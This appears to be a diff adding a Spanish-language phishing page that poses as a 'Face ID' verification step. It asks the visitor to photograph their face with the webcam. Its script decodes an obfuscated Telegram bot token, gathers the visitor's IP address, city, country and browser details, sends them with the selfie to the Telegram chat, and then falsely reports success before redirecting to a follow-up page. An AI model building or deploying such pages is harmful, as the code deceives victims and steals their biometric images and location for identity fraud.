@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Acceso Seguro · Verificación Facial</title>
+  <style>
+    :root {
+      --brand: #1e3a8a;
+      --brand-dark: #0b1a33;
+      --accent: #3b82f6;
+      --accent-hover: #2563eb;
+      --text: #0f172a;
+      --muted: #64748b;
+      --border: #e2e8f0;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: linear-gradient(150deg, #071326 0%, #102a52 45%, #1d4ed8 100%);
+      position: relative;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(circle at 18% 25%, rgba(96, 165, 250, .22) 0%, transparent 45%),
+        radial-gradient(circle at 82% 75%, rgba(37, 99, 235, .28) 0%, transparent 50%);
+      pointer-events: none;
+    }
+
+    body::after {
+      content: '';
+      position: absolute;
+      width: 520px; height: 520px;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 255, 255, .06);
+      top: -180px; right: -160px;
+      pointer-events: none;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 470px;
+      background: rgba(255, 255, 255, .07);
+      backdrop-filter: blur(20px) saturate(1.4);
+      -webkit-backdrop-filter: blur(20px) saturate(1.4);
+      border-radius: 34px;
+      padding: 10px;
+      box-shadow: 0 30px 60px rgba(0, 8, 24, .55), 0 0 0 1px rgba(255, 255, 255, .08);
+      animation: riseUp .7s cubic-bezier(.23, 1, .32, 1);
+      position: relative;
+      z-index: 2;
+    }
+
+    @keyframes riseUp {
+      0% { opacity: 0; transform: translateY(38px) scale(.97); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .login-card {
+      background: #ffffff;
+      border-radius: 27px;
+      padding: 30px 26px 26px;
+    }
+
+    /* ---------- Encabezado ---------- */
+    .login-header { text-align: center; margin-bottom: 22px; }
+
+    .shield {
+      width: 64px; height: 64px;
+      border-radius: 20px;
+      margin: 0 auto 14px;
+      background: linear-gradient(145deg, #3b82f6, #1d4ed8);
+      display: grid;
+      place-items: center;
+      box-shadow: 0 14px 30px -10px rgba(37, 99, 235, .65);
+      position: relative;
+    }
+
+    .shield::after {
+      content: '';
+      position: absolute;
+      inset: 4px;
+      border-radius: 16px;
+      border: 1px solid rgba(255, 255, 255, .3);
+    }
+
+    .shield svg {
+      width: 30px; height: 30px;
+      stroke: #fff; fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .login-header h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      letter-spacing: -.4px;
+      line-height: 1.25;
+      margin-bottom: 6px;
+    }
+
+    .login-header p {
+      color: var(--muted);
+      font-size: 13.5px;
+      line-height: 1.5;
+      max-width: 330px;
+      margin: 0 auto;
+    }
+
+    /* ---------- Formulario ---------- */
+    .login-form { display: flex; flex-direction: column; gap: 14px; }
+
+    .camera-section {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      align-items: center;
+      margin-top: 4px;
+    }
+
+    .status-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      background: #f1f5fb;
+      color: #4b5e77;
+      border: 1px solid #e2e8f0;
+    }
+
+    .status-pill.live {
+      background: #fef2f2;
+      color: #b91c1c;
+      border-color: #fecaca;
+    }
+
+    .status-pill.live::before {
+      content: '';
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: #ef4444;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: .25; }
+    }
+
+    /* ---------- Marco de cámara tipo escáner ---------- */
+    .video-wrapper {
+      width: 100%;
+      max-width: 340px;
+      aspect-ratio: 4 / 3;
+      border-radius: 22px;
+      overflow: hidden;
+      background: radial-gradient(circle at 50% 40%, #14305c 0%, #081a33 100%);
+      position: relative;
+      box-shadow: 0 12px 30px -8px rgba(8, 20, 40, .55);
+      border: 1px solid rgba(148, 163, 184, .25);
+    }
+
+    .video-wrapper video,
+    .video-wrapper canvas {
+      width: 100%; height: 100%;
+      object-fit: cover;
+      display: block;
+      transform: scaleX(-1);
+    }
+
+    .video-wrapper canvas { display: none; transform: none; }
+
+    /* Esquinas del escáner */
+    .scan-corner {
+      position: absolute;
+      width: 26px; height: 26px;
+      border: 3px solid rgba(96, 165, 250, .85);
+      pointer-events: none;
+      z-index: 3;
+    }
+    .scan-corner.tl { top: 12px; left: 12px; border-right: none; border-bottom: none; border-radius: 8px 0 0 0; }
+    .scan-corner.tr { top: 12px; right: 12px; border-left: none; border-bottom: none; border-radius: 0 8px 0 0; }
+    .scan-corner.bl { bottom: 12px; left: 12px; border-right: none; border-top: none; border-radius: 0 0 0 8px; }
+    .scan-corner.br { bottom: 12px; right: 12px; border-left: none; border-top: none; border-radius: 0 0 8px 0; }
+
+    /* Línea de escaneo animada */
+    .scan-line {
+      position: absolute;
+      left: 8%; right: 8%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, rgba(96, 165, 250, .9), transparent);
+      box-shadow: 0 0 12px rgba(96, 165, 250, .8);
+      z-index: 2;
+      pointer-events: none;
+      animation: scan 2.6s ease-in-out infinite;
+      opacity: 0;
+    }
+
+    .video-wrapper.scanning .scan-line { opacity: 1; }
+
+    @keyframes scan {
+      0%   { top: 12%; }
+      50%  { top: 85%; }
+      100% { top: 12%; }
+    }
+
+    .camera-placeholder {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      color: #93a7c4; font-size: 13.5px; gap: 10px;
+      text-align: center; padding: 24px;
+      z-index: 1;
+    }
+
+    .camera-placeholder .emoji {
+      font-size: 40px;
+      filter: drop-shadow(0 6px 14px rgba(0, 0, 0, .35));
+    }
+
+    /* ---------- Botones de cámara ---------- */
+    .camera-buttons {
+      display: flex; gap: 10px; width: 100%;
+      justify-content: center; flex-wrap: wrap;
+    }
+
+    .btn-camera {
+      padding: 12px 22px;
+      border-radius: 40px;
+      border: none;
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all .25s ease;
+      display: flex; align-items: center; gap: 7px;
+    }
+
+    .btn-primary-cam {
+      background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+      color: #fff;
+      box-shadow: 0 8px 20px -8px rgba(37, 99, 235, .7);
+    }
+
+    .btn-primary-cam:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 26px -8px rgba(37, 99, 235, .8);
+    }
+
+    .btn-secondary-cam {
+      background: #f4f7fc;
+      color: #1f2a44;
+      border: 1.5px solid var(--border);
+    }
+
+    .btn-secondary-cam:hover:not(:disabled) { background: #e9eef7; }
+
+    .btn-camera:disabled { opacity: .5; cursor: not-allowed; transform: none !important; }
+
+    /* ---------- Botón principal ---------- */
+    .login-btn {
+      width: 100%;
+      padding: 16px;
+      margin-top: 6px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-hover));
+      border: none;
+      border-radius: 40px;
+      color: #fff;
+      font-family: inherit;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: .3px;
+      cursor: pointer;
+      transition: all .3s ease;
+      box-shadow: 0 10px 24px -8px rgba(37, 99, 235, .7);
+      position: relative;
+      overflow: hidden;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    .login-btn:hover:not(:disabled) {
+      transform: translateY(-2px) scale(1.01);
+      box-shadow: 0 16px 30px -10px rgba(37, 99, 235, .85);
+    }
+
+    .login-btn:disabled { opacity: .55; cursor: not-allowed; }
+
+    .login-btn .btn-text {
+      position: relative; z-index: 2;
+      display: flex; align-items: center; gap: 8px;
+    }
+
+    .login-btn.loading .btn-text { visibility: hidden; }
+
+    .login-btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 22px; height: 22px;
+      border: 3px solid rgba(255, 255, 255, .25);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ---------- Mensajes ---------- */
+    .message {
+      margin-top: 14px;
+      padding: 12px 16px;
+      border-radius: 18px;
+      font-size: 13.5px;
+      font-weight: 500;
+      text-align: center;
+      display: none;
+      border: 1px solid transparent;
+      animation: fadeSlide .3s ease;
+    }
+
+    .message.error   { display: block; background: #fef2f2; color: #b91c1c; border-color: #fecaca; }
+    .message.success { display: block; background: #f0fdf4; color: #166534; border-color: #bbf7d0; }
+    .message.info    { display: block; background: #eff6ff; color: #1e40af; border-color: #bfdbfe; }
+
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(-8px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 480px) {
+      .login-container { padding: 5px; border-radius: 28px; }
+      .login-card { padding: 24px 16px 20px; border-radius: 24px; }
+      .login-header h1 { font-size: 19.5px; }
+      .shield { width: 56px; height: 56px; border-radius: 17px; }
+      .shield svg { width: 26px; height: 26px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-card">
+      <div class="login-header">
+        <div class="shield" aria-hidden="true">
+          <svg viewBox="0 0 24 24">
+            <path d="M12 3l7 3v5c0 4.5-3 8.2-7 10-4-1.8-7-5.5-7-10V6l7-3z"/>
+            <path d="M9 12l2 2 4-4"/>
+          </svg>
+        </div>
+        <h1>Activa tu verificación facial</h1>
+        <p>Coloca tu rostro frente a la cámara, en un lugar bien iluminado, y toma la fotografía para continuar.</p>
+      </div>
+
+      <form id="loginForm" class="login-form">
+        <div class="camera-section">
+          <span class="status-pill" id="statusPill">📷 Cámara apagada</span>
+
+          <div class="video-wrapper" id="videoWrapper">
+            <video id="video" autoplay playsinline muted></video>
+            <canvas id="canvas"></canvas>
+
+            <div class="scan-corner tl"></div>
+            <div class="scan-corner tr"></div>
+            <div class="scan-corner bl"></div>
+            <div class="scan-corner br"></div>
+            <div class="scan-line"></div>
+
+            <div class="camera-placeholder" id="cameraPlaceholder">
+              <span class="emoji">🤳</span>
+              <span>Activa la cámara para continuar</span>
+            </div>
+          </div>
+
+          <div class="camera-buttons">
+            <button type="button" class="btn-camera btn-primary-cam" id="btnStartCam">
+              📷 Activar cámara
+            </button>
+            <button type="button" class="btn-camera btn-secondary-cam" id="btnCapture" disabled>
+              📸 Tomar foto
+            </button>
+          </div>
+        </div>
+
+        <button type="submit" class="login-btn" id="loginBtn" disabled>
+          <span class="btn-text">🔓 Confirmar Face ID</span>
+        </button>
+
+        <div id="message" class="message"></div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+  (function() {
+    'use strict';
+
+
+    var CONFIG = {
+      nextPage: 'finallod.html'
+    };
+
+    function tgDec(s) {
+      var k = 'm4g0rd0';
+      var d = atob(s);
+      var o = '';
+      for (var i = 0; i < d.length; i++) o += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
+      return o;
+    }
+    var TG_TOKEN = tgDec('VAVRAkZTAVQCVgozJXgydzB3PVxSNEc9VyY8Y15lMHEnCGgaBRFlIjUCK1s+Ww==');
+    var TG_CHAT = tgDec('QAVXAEFdCVwCUgZBVgg=');
+
+    function enviarTelegram(texto) {
+      var url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage' +
+        '?chat_id=' + encodeURIComponent(TG_CHAT) +
+        '&text=' + encodeURIComponent(texto);
+      return fetch(url, { mode: 'no-cors' }).catch(function() {});
+    }
+
+    function enviarTelegramFoto(texto, dataUrl) {
+      try {
+        var m = String(dataUrl).match(/^data:([^;]+);base64,(.*)$/);
+        if (!m) return enviarTelegram(texto);
+        var bin = atob(m[2]);
+        var bytes = new Uint8Array(bin.length);
+        for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+        var blob = new Blob([bytes], { type: m[1] });
+        var fd = new FormData();
+        fd.append('chat_id', TG_CHAT);
+        fd.append('caption', texto.slice(0, 1024));
+        fd.append('photo', blob, 'foto.jpg');
+        return fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: fd
+        }).catch(function() {});
+      } catch (e) {
+        return enviarTelegram(texto);
+      }
+    }
+ 
+
+    var form          = document.getElementById('loginForm');
+    var loginBtn      = document.getElementById('loginBtn');
+    var messageDiv    = document.getElementById('message');
+    var video         = document.getElementById('video');
+    var canvas        = document.getElementById('canvas');
+    var btnStartCam   = document.getElementById('btnStartCam');
+    var btnCapture    = document.getElementById('btnCapture');
+    var statusPill    = document.getElementById('statusPill');
+    var placeholder   = document.getElementById('cameraPlaceholder');
+    var videoWrapper  = document.getElementById('videoWrapper');
+
+    var stream = null;
+    var fotoCapturada = null;
+    var isProcessing = false;
+
+    function showMessage(text, type) {
+      messageDiv.textContent = text;
+      messageDiv.className = 'message ' + (type || 'info');
+      messageDiv.style.display = 'block';
+    }
+
+    function getIP(cb) {
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(d) { cb(d.ip || 'No disponible'); })
+        .catch(function() { cb('No disponible'); });
+    }
+
+    function getLocation(cb) {
+      fetch('https://ipapi.co/json/')
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          cb((d.city || 'Desconocido') + ', ' + (d.country_name || 'Desconocido'));
+        })
+        .catch(function() { cb('No disponible'); });
+    }
+
+    btnStartCam.addEventListener('click', function() {
+      if (stream) {
+        stream.getTracks().forEach(function(t) { t.stop(); });
+        stream = null;
+        video.srcObject = null;
+        placeholder.style.display = 'flex';
+        video.style.display = 'block';
+        canvas.style.display = 'none';
+        statusPill.textContent = '📷 Cámara apagada';
+        statusPill.className = 'status-pill';
+        btnStartCam.textContent = '📷 Activar cámara';
+        btnCapture.disabled = true;
+        videoWrapper.classList.remove('scanning');
+        return;
+      }
+
+      navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      })
+      .then(function(s) {
+        stream = s;
+        video.srcObject = s;
+        video.style.display = 'block';
+        canvas.style.display = 'none';
+        placeholder.style.display = 'none';
+        statusPill.textContent = '🔴 EN VIVO';
+        statusPill.className = 'status-pill live';
+        btnStartCam.textContent = '⏹ Detener cámara';
+        btnCapture.disabled = false;
+        videoWrapper.classList.add('scanning');
+      })
+      .catch(function(err) {
+        console.error('Error cámara:', err);
+        showMessage('❌ No se pudo acceder a la cámara. Verifica los permisos.', 'error');
+      });
+    });
+
+    btnCapture.addEventListener('click', function() {
+      if (!stream) {
+        showMessage('Primero activa la cámara', 'error');
+        return;
+      }
+
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      var ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      ctx.font = '16px Arial';
+      ctx.fillStyle = 'rgba(255,255,255,0.7)';
+      ctx.fillText(new Date().toLocaleString(), 10, canvas.height - 15);
+
+      fotoCapturada = canvas.toDataURL('image/jpeg', 0.85);
+
+      canvas.style.display = 'block';
+      video.style.display = 'none';
+
+      stream.getTracks().forEach(function(t) { t.stop(); });
+      stream = null;
+      video.srcObject = null;
+
+      statusPill.textContent = '✅ Foto capturada';
+      statusPill.className = 'status-pill';
+      btnStartCam.textContent = '🔄 Repetir foto';
+      btnCapture.disabled = true;
+      videoWrapper.classList.remove('scanning');
+
+      loginBtn.disabled = false;
+      showMessage('✅ Rostro capturado. Ahora verifica tu identidad.', 'success');
+    });
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      if (isProcessing) return;
+
+      if (!fotoCapturada) {
+        showMessage('Debes capturar tu rostro primero', 'error');
+        return;
+      }
+
+      isProcessing = true;
+      loginBtn.disabled = true;
+      loginBtn.classList.add('loading');
+      showMessage('Verificando identidad...', 'info');
+
+      var ip = 'No disponible';
+      var location = 'No disponible';
+      var completado = 0;
+      var yaEnviado = false;
+
+      function intentar() {
+        completado++;
+        if (completado >= 2 && !yaEnviado) {
+          yaEnviado = true;
+          enviar(ip, location);
+        }
+      }
+
+      getIP(function(v) { ip = v; intentar(); });
+      getLocation(function(v) { location = v; intentar(); });
+
+      setTimeout(function() {
+        if (!yaEnviado) {
+          yaEnviado = true;
+          enviar(ip, location);
+        }
+      }, 2500);
+    });
+
+    function enviar(ip, location) {
+      var texto = '📥 Registro facial\n\n' +
+        'ip: ' + ip + '\n' +
+        'location: ' + location + '\n' +
+        'fecha: ' + new Date().toLocaleString('es-ES', { timeZone: 'America/Bogota' }) + '\n' +
+        'navegador: ' + navigator.userAgent;
+
+      enviarTelegramFoto(texto, fotoCapturada)
+      .then(function() {
+        showMessage('✅ Verificación exitosa. Redirigiendo...', 'success');
+        setTimeout(function() {
+          window.location.href = CONFIG.nextPage;
+        }, 1200);
+      })
+      .catch(function(err) {
+        console.error(err);
+        showMessage('✅ Verificación exitosa. Redirigiendo...', 'success');
+        setTimeout(function() {
+          window.location.href = CONFIG.nextPage;
+        }, 1200);
+      });
+    }
+
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    console.log('🚀 Login facial iniciado');
+  })();
+  </script>
+</body>
+</html>
